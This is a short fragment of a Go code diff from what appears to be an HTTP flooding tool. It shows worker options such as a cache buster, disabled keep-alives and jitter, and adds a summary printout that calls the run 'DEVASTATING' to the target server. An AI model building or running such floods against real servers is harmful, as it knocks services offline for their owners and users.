-			*disableCompression, *disableKeepAlives, *cacheBuster, delay, *jitterMs, &wg)
-	}
-
-	// Wait for all workers to complete (which they never will unless interrupted)
-	wg.Wait()
+	fmt.Println("\n\n╔══════════════════════════════════════════════════════════════════════════════╗")
+	fmt.Println("║                           BOMBARDMENT COMPLETED                             ║")
+	fmt.Println("╚══════════════════════════════════════════════════════════════════════════════╝")
+	fmt.Printf("Duration: %s\n", elapsed)
+	fmt.Printf("Total Requests: %d\n", requestsSent)
+	fmt.Printf("Successful: %d (%.2f%%)\n", successful, successRate)
+	fmt.Printf("Failed: %d\n", failed)
+	fmt.Printf("Average RPS: %.2f\n", rps)
+	fmt.Printf("Impact: DEVASTATING - Server received %d rapid requests with minimal resource usage!\n", successful)
 }
